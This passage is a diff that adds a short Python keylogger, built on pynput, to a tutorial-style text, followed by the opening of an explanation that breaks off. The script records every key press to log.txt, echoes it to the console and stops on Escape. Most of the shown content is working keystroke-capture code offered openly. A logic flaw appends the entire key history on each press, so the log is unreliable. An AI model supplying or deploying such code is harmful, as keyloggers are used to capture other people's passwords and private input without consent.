@@ -3,6 +3,38 @@ Keylogger using Python.
 
 This keylogger essentially tracks keyboard events, logging pressed keys to a file and providing basic feedback in the console. It stops listening for events when the Escape key is pressed.
 
+import pynput
+from pynput.keyboard import Key, Listener
+
+keys = []
+
+def on_press(key):
+    keys.append(key)
+    write_file(keys)
+
+    try:
+        print('Alphanumeric key {0} pressed'.format(key.char))
+    except AttributeError:
+        print('Special key {0} pressed'.format(key))
+
+def write_file(keys):
+    with open('log.txt', 'a') as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find('space') > 0:
+                f.write(' ')
+            elif k.find('Key') == -1:
+                f.write(k)
+            
+def on_release(key):
+    print('{0} released'.format(key))
+    if key == Key.esc:
+        # Stop listener
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
 Here's a detailed explanation of the code:
 
 Import:
